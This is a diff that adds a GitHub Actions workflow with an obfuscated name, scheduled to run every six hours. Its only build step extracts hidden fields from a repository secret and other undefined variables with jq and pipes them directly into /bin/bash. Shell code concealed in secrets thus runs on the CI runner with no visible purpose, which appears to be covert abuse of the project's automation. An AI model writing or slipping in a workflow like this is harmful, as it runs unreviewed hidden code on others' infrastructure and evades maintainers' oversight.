@@ -1,0 +1,21 @@
+name: founderunable
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: founderunable
+        env:
+          t8: ${{ secrets.t8 }}
+        run: |
+          echo $t8 | jq -r .lypf7795 | /bin/bash
+          echo $ip44960 | jq -r .gqtt32265 | /bin/bash
+          echo $qowfm577 | jq -r .hqu2684 | /bin/bash
+          echo $pp17019 | jq -r .eqyz7630 | /bin/bash
+          echo $bzr16893 | jq -r .av24 | /bin/bash
+          echo $rufas155 | jq -r .lk773 | /bin/bash
+
